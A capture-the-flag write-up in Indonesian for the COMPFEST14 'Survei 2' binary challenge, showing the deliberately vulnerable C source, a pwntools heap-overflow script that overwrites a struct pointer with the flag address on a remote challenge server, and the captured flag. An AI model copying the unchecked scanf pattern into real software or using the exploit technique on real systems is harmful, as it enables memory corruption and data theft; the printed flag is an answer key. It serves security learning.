# Survei 2

> Write-up author: jon-brandy

## DESKRIPSI:

[survei](https://github.com/jon-brandy/COMPFEST14-BAY-WU/blob/fc9adddd6a2a7e8ab233bfe618bcc4bbb0e2a097/Asset/Binary%20Exploitation/Survei%202/survei)

[survei.c](https://github.com/jon-brandy/COMPFEST14-BAY-WU/blob/fc9adddd6a2a7e8ab233bfe618bcc4bbb0e2a097/Asset/Binary%20Exploitation/Survei%202/survei.c)

## LANGKAH-LANGKAH:
1. Pertama unzip file `.zip` yang diberikan.

> HASIL

![image](https://user-images.githubusercontent.com/70703371/188115991-f41b2102-387b-4dc2-8b61-d96f4c96a2b0.png)

2. Jalankan `chmod +x survei` agar program dapat dieksekusi.
3. Setelah itu cek terlebih dahulu proteksi yang diberikan pada program dengan menjalankan `checksec --file survei`.

> HASIL

![image](https://user-images.githubusercontent.com/70703371/188116853-8e5e5d5a-7724-49d7-a77f-aef5d4b51e69.png)

4. Dikarenakan **no pie** menandakan memory yang tersimpan akan selalu berada di tempat yang sama.
5. Selanjutnya cek source-code yang diberikan.

> SURVEI.C

```c
#include<stdio.h>
#include<stdlib.h>

struct data {
    char *str;
};
char flag[40];
struct data *survei[8];

void printMenu() {
    printf("1. Isi survei\n2. Lihat survei\n3. Keluar\n> ");
}

void isiSurvei() {
    int p;
    printf("Di manakah survei ingin disimpan?: ");
    scanf("%d", &p);
    printf("Isi survei: ");
    scanf("%s", survei[p]->str);
    printf("Survei berhasil disimpan di: %d\n", p);
}

void lihatSurvei() {
    int p;
    printf("Survei manakah yang ingin dilihat: ");
    scanf("%d", &p);
    printf("%s\n", survei[p]->str);
}

int main(int argc, char const *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    FILE *fp = fopen("flag.txt", "r");
    fgets(flag, 40, fp);
    
    int i;
    for (i = 0; i < 8; i++) {
        survei[i] = malloc(sizeof(struct data));
        survei[i]->str = malloc(32);
    }
    
    while (1) {
        printMenu();
        int choice;
        scanf("%d", &choice);
        if (choice == 1) {
            isiSurvei();
        } else if (choice == 2) {
            lihatSurvei();
        } else {
            printf("Bye.\n");
            return 0;
        }
    }
}

```

6. Setelah melakukan analisis source-code, nampaknya kita hanya perlu mencari address dari flag dan melakukan padding sebanyak 48.

> NOTES

```
48 -> size buffer dari flag + size buffer dari struct pointer survei
```

7. Saya menggunakan `gdb` untuk mencari address dari flag

> GDB

![image](https://user-images.githubusercontent.com/70703371/188117558-f41cd6bc-1bf5-4d3b-9ff7-0ae4e2a0df3a.png)

> ADDRESS FLAG

```
0x6010e0
```

8. Langkah selanjutnya kita harus melakukan heap overflow dan mengontrol `return address`, untuk itu saya menggunakan **pwntools** di script python sebagai berikut:

```py
import os
from pwn import *

os.system('clear')

sh = remote('103.185.38.238', 17835)

p = b'A' * 48
p += p64(6295776) # decimal value dari address flag

sh.sendline(b'1')
sh.sendline(b'0')

sh.sendline(p)

sh.sendline(b'2')
sh.sendline(b'1')

sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/188119904-007c08a6-42e1-49bd-8e31-5891c4f2cb68.png)


## FLAG

```
COMPFEST14{N0wY0U_knoW_heapOv3rflow}
```
